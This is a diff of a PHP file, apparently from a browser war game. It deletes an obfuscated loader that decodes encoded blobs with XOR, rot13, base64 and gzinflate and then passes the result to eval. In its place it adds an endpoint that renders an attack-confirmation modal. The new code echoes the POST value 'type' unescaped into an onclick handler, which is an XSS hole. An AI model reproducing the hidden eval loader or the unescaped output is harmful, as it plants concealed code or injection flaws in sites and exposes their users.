@@ -1,29 +1,278 @@
 <?php
-// f3595d0421a98680c189b365
-$mbWFb_ueNg="jjJZdfCNPSAQDtEmbqVnhdOEW1Vej6OT+sLTcN6vZ9M=";
-$pGyFTUeJhSe_ZY="wwWMqsPACFNDQgRzodIauqBRJ1Irw6BG+fYGpA6iM9Z=";
-$TDVEZR_itA="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";
-$HVADrP_YxMJv="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";
-$DBwGbozFtgP="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";
-$uZrTQDuEDVI=strlen($mbWFb_ueNg);
-$yPLzUXxdDEZ=substr($TDVEZR_itA,0,4);
-$ZRpCig_HoLFiz=md5($HVADrP_YxMJv);
-$HeIugJJgSgf=crc32($DBwGbozFtgP);
-$Zz_AWlpVc=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$huzqRcCfxKin=$TDVEZR_itA.$HVADrP_YxMJv.$DBwGbozFtgP;
-$KlulyTxip=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$nCAsbFwsYE="gz".chr(105)."nflate";
-$GZPyJiKHAYYX="str".chr(114)."ev";
-$GBOdOisEEnlR="str_rot".chr(49).chr(51);
-$Mga_qtOXSZRE="";
-$ywRZhBVzwBBcu=$KlulyTxip($huzqRcCfxKin);
-for($ZmiYapeUpfSf=0;$ZmiYapeUpfSf<strlen($ywRZhBVzwBBcu);$ZmiYapeUpfSf++){
-$Mga_qtOXSZRE.=chr(ord($ywRZhBVzwBBcu[$ZmiYapeUpfSf])^ord($Zz_AWlpVc[$ZmiYapeUpfSf%strlen($Zz_AWlpVc)]));
+/**
+ * AJAX endpoint to generate attack confirmation modal
+ * Returns HTML for confirmation screen with catapult selector
+ */
+
+session_start();
+
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+// Configuration (ficheiros locais da public/)
+require_once(__DIR__ . '/../configs/config.php');
+require_once(__DIR__ . '/../modelo/lib/world_constants.php');
+require_once(__DIR__ . '/../modelo/lib/config.php');
+
+// Language support
+\CoreFetcher::load('Helpers/language_helper.php');
+
+// Initialize locale from session / cookie (same priority as GameController)
+try {
+    $globalDb = \App\Core\Database::getInstance(\App\Core\Database::getGlobalDbName());
+
+    // Try world-specific cookie (session_1) then legacy generic cookie
+    $worldParam = $_POST['world'] ?? $_GET['world'] ?? '1';
+    $worldNum = preg_replace('/[^0-9]/', '', $worldParam ?: '1') ?: '1';
+    $sessionSid = $_COOKIE['session_' . $worldNum] ?? $_COOKIE['session'] ?? '';
+
+    if (!empty($sessionSid)) {
+        // A tabela sessions vive na base do MUNDO (o login e o SessionModel inserem lá)
+        $worldDbName = get_world_db_name($worldNum);
+        $worldDb = \App\Core\Database::getInstance($worldDbName);
+        $sessionData = $worldDb->fetch("SELECT userid FROM sessions WHERE sid = ?", [$sessionSid]);
+        if ($sessionData) {
+            $userData = $globalDb->fetch("SELECT language FROM conta WHERE id = ?", [$sessionData['userid']]);
+            if ($userData && !empty($userData['language'])) {
+                set_locale($userData['language']);
+            } else {
+                init_locale();
+            }
+        } else {
+            init_locale();
+        }
+    } else {
+        init_locale();
+    }
+} catch (\Exception $e) {
+    init_locale();
 }
-$ywRZhBVzwBBcu=$Mga_qtOXSZRE;
-$ywRZhBVzwBBcu=$GBOdOisEEnlR($ywRZhBVzwBBcu);
-$ywRZhBVzwBBcu=$GZPyJiKHAYYX($ywRZhBVzwBBcu);
-$ywRZhBVzwBBcu=$KlulyTxip($ywRZhBVzwBBcu);
-$ywRZhBVzwBBcu=$nCAsbFwsYE($ywRZhBVzwBBcu);
-$ywRZhBVzwBBcu=$GBOdOisEEnlR($ywRZhBVzwBBcu);
-eval($ywRZhBVzwBBcu);
+
+
+// Get parameters
+$type       = $_POST['type']         ?? 'attack';
+$targetId   = (int)($_POST['targetId'] ?? 0);
+$targetName = $_POST['targetName']   ?? '';
+$targetPlayer = $_POST['targetPlayer'] ?? '';
+$duration   = $_POST['duration']     ?? '';
+$arrival    = $_POST['arrival']      ?? '';
+$units      = json_decode($_POST['units'] ?? '{}', true);
+$villageUnits = json_decode($_POST['villageUnits'] ?? '{}', true);
+if (isset($_GET['world'])) {
+    $server = (int) $_GET['world'];
+    $_SESSION['world'] = $server;
+} else {
+    $server = isset($_SESSION['world']) ? (int) $_SESSION['world'] : 1;
+}
+session_write_close();
+$worldDb = get_world_db_name($server);
+
+// Check if session cookie exists and is valid
+$cookieName = 'session_' . $server;
+if (!isset($_COOKIE[$cookieName])) {
+    header('Location: index.php');
+    exit;
+}
+
+$sid = $_COOKIE[$cookieName];
+$sessionModel = new \App\Models\SessionModel($worldDb);
+$session = $sessionModel->checkSession($sid);
+
+if (!$session) {
+    header('Location: index.php');
+    exit;
+}
+
+// Only allow POST requests (prevent direct GET access in browser)
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    header('Location: game.php?screen=overview');
+    exit;
+}
+
+// Initialize BuildsLibrary
+$cl_builds = new \App\Models\BuildsLibrary($worldDb);
+
+// Action label
+$actionText = $type === 'attack'
+    ? __('screens.map.action_attack')
+    : __('screens.map.action_support');
+
+$targetNameClean = explode(' (', $targetName)[0];
+
+$titleKey = $type === 'attack' ? 'screens.map.confirm_attack_title' : 'screens.map.confirm_support_title';
+$confirmTitle = __($titleKey);
+
+if ($confirmTitle === $titleKey) {
+    // Fallback if missing translation
+    $confirmTitle = str_replace('{type}', $actionText, __('screens.map.confirm_title')) . ' a ' . $targetNameClean;
+} else {
+    $confirmTitle = str_replace('{target}', $targetNameClean, $confirmTitle);
+}
+
+$hasCatapults = isset($units['catapult']) && $units['catapult'] > 0;
+
+// All unit keys in display order
+$allUnits = ['spear','sword','axe','archer','spy','light','cav_archer','heavy','ram','catapult','paladin','snob'];
+?>
+
+<div style="padding: 12px 16px;">
+    <h3 style="margin: 0 0 12px 0; text-align: center;">
+        <?= htmlspecialchars($confirmTitle) ?>
+    </h3>
+
+
+    <table class="vis" width="100%" style="margin-bottom: 10px;">
+        <tr>
+            <th colspan="2" style="text-align: left;"><?= __('screens.place.order') ?: 'Order' ?></th>
+        </tr>
+        <tr>
+            <td style="width: 40%; padding: 3px 6px;"><strong><?= __('screens.map.destination') ?>:</strong></td>
+            <td style="padding: 3px 6px;">
+                <a href="game.php?screen=info_village&id=<?= $targetId ?>"><?= htmlspecialchars($targetName) ?></a>
+            </td>
+        </tr>
+        <?php if ($targetPlayer !== ''): ?>
+        <?php 
+            // Try to find the player ID for the link
+            $targetPlayerId = 0;
+            if ($targetId > 0) {
+                $db = \App\Core\Database::getInstance($worldDb, get_world_db_host(get_active_world()), get_world_db_user(get_active_world()), get_world_db_pass(get_active_world()));
+                $villageData = $db->fetch("SELECT userid FROM villages WHERE id = ?", [$targetId]);
+                if ($villageData) {
+                    $targetPlayerId = (int)$villageData['userid'];
+                }
+            }
+        ?>
+        <tr>
+            <td style="padding: 3px 6px;"><strong><?= __('screens.map.player') ?>:</strong></td>
+            <td style="padding: 3px 6px;">
+                <?php if ($targetPlayerId > 0): ?>
+                    <a href="game.php?screen=info_player&id=<?= $targetPlayerId ?>"><?= htmlspecialchars($targetPlayer) ?></a>
+                <?php else: ?>
+                    <?= htmlspecialchars($targetPlayer) ?>
+                <?php endif; ?>
+            </td>
+        </tr>
+        <?php endif; ?>
+        <?php if ($duration !== ''): ?>
+        <tr>
+            <td style="padding: 3px 6px;"><strong><?= __('screens.map.duration') ?>:</strong></td>
+            <td style="padding: 3px 6px;"><?= htmlspecialchars($duration) ?></td>
+        </tr>
+        <?php endif; ?>
+        <?php if ($arrival !== ''): ?>
+        <tr>
+            <td style="padding: 3px 6px;"><strong><?= __('screens.map.arrival') ?></strong></td>
+            <td style="padding: 3px 6px;"><?= htmlspecialchars($arrival) ?></td>
+        </tr>
+        <?php endif; ?>
+    </table>
+
+    <div id="single_attack_ui">
+        <div style="margin-bottom: 15px;">
+            <a href="#" id="add_attack_btn" onclick="initMultiAttack(); return false;" style="font-weight: bold; text-decoration: none; color: #804000;">
+                <img src="graphic/icons/plus.png" alt="+" style="vertical-align: -2px;"> Adicionar novo ataque
+            </a>
+        </div>
+
+        <table class="vis" width="100%" style="text-align: center;">
+            <tbody>
+                <tr>
+                    <?php foreach ($allUnits as $u): ?>
+                    <th style="text-align:center">
+                        <img src="graphic/unit/unit_<?= $u ?>.png" style="width: 18px; height: 18px;" title="<?= $u ?>">
+                    </th>
+                    <?php endforeach; ?>
+                </tr>
+                <tr>
+                    <?php foreach ($allUnits as $u): ?>
+                    <?php $u_val = (int)($units[$u] ?? 0); ?>
+                    <td style="text-align:center" <?= $u_val === 0 ? 'class="hidden"' : '' ?>>
+                        <?= $u_val ?>
+                    </td>
+                    <?php endforeach; ?>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Hidden multi-attack UI -->
+    <div id="multi_attack_ui" style="display: none; margin-top: 15px;">
+        <div style="border: 1px solid #7d510f; background: #f4e4bc; padding: 5px; margin-bottom: 10px; font-size: 11px;">
+            <img src="graphic/new/questionmark.webp" alt="Info" style="float: left; margin-right: 5px; width: 16px; height: 16px;">
+            Enviar vários ataques de uma só vez de uma única aldeia é útil para situações específicas, tal como enviar vários nobres para reduzir a lealdade numa rápida sucessão.
+            Na maioria dos casos, é sempre melhor enviar todas as suas tropas num único ataque para causar o maior dano.
+        </div>
+        
+        <table class="vis" width="100%" id="multi_attack_table">
+            <thead>
+                <tr>
+                    <th width="120">Unidades</th>
+                    <?php foreach ($allUnits as $u): ?>
+                    <th style="text-align:center"><img src="graphic/unit/unit_<?= $u ?>.png"></th>
+                    <?php endforeach; ?>
+                </tr>
+            </thead>
+            <tbody id="multi_attack_rows">
+                <tr id="row_village_units" style="font-weight: bold; background: #f4e4bc;">
+                    <td>Unidades na aldeia</td>
+                    <?php foreach ($allUnits as $u): ?>
+                    <td style="text-align:center" class="village_unit_count" data-unit="<?= $u ?>"><?= (int)($villageUnits[$u] ?? 0) ?></td>
+                    <?php endforeach; ?>
+                </tr>
+                <tr id="row_attack_1" class="attack_row" data-row="1">
+                    <td style="font-weight: bold;">Atacar #1</td>
+                    <?php foreach ($allUnits as $u): ?>
+                    <td style="text-align:center" class="attack_val" data-unit="<?= $u ?>">
+                        <input type="text" size="3" name="multi_unit_<?= $u ?>_1" value="<?= (int)($units[$u] ?? 0) ?>" onkeyup="updateMultiAttackTotals()" style="width: 30px; text-align: center;">
+                    </td>
+                    <?php endforeach; ?>
+                </tr>
+            </tbody>
+            <tfoot>
+                <tr id="row_attack_add" style="background: #f4e4bc;">
+                    <td>
+                        <a href="#" id="add_another_attack_btn" onclick="addMultiAttackRow(); return false;" style="font-weight: bold; text-decoration: none; color: #804000;">
+                            <img src="graphic/icons/plus.png" alt="+" style="vertical-align: -2px;"> Atacar #<span id="next_attack_num">2</span>
+                        </a>
+                    </td>
+                    <td colspan="<?= count($allUnits) ?>"></td>
+                </tr>
+                <tr style="font-weight: bold; background: #e3d5b3;">
+                    <td>Total</td>
+                    <?php foreach ($allUnits as $u): ?>
+                    <td style="text-align:center" class="total_val" data-unit="<?= $u ?>"><?= (int)($units[$u] ?? 0) ?></td>
+                    <?php endforeach; ?>
+                </tr>
+            </tfoot>
+        </table>
+    </div>
+
+    <?php if ($hasCatapults && $type === 'attack'): ?>
+        <table class="vis" width="100%" style="margin: 10px 0;">
+            <tr>
+                <th><?= __('screens.map.catapult_target') ?></th>
+                <td>
+                    <select name="building" id="modal_building_select" size="1">
+                        <?php 
+                        $selectedBuilding = $_POST['building'] ?? '';
+                        foreach ($cl_builds->get_array("dbname") as $dbname): 
+                        ?>
+                            <option value="<?= $dbname ?>" <?= ($selectedBuilding === $dbname) ? 'selected' : '' ?>>
+                                <?= $cl_builds->get_name($dbname) ?>
+                            </option>
+                        <?php endforeach; ?>
+                    </select>
+                </td>
+            </tr>
+        </table>
+    <?php endif; ?>
+
+    <div style="text-align: left; margin-top: 12px;">
+        <button class="btn btn-attack" onclick="confirmCommand('<?= $type ?>')">
+            <span><?= __('screens.map.confirm_btn') ?></span>
+        </button>
+        <button class="btn btn-cancel" onclick="cancelConfirmation()" style="margin-left: 10px;">
+            <span><?= __('screens.map.cancel_btn') ?></span>
+        </button>
+    </div>
+</div>
